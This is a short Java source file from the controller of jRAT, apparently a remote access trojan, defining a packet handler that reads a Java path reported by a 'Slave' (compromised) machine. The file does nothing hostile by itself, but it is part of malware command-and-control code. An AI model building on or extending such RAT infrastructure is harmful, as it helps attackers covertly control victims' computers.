package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet15InitJavaPath extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {

		String path = slave.readLine();
		slave.setJavaPath(path);

	}
}
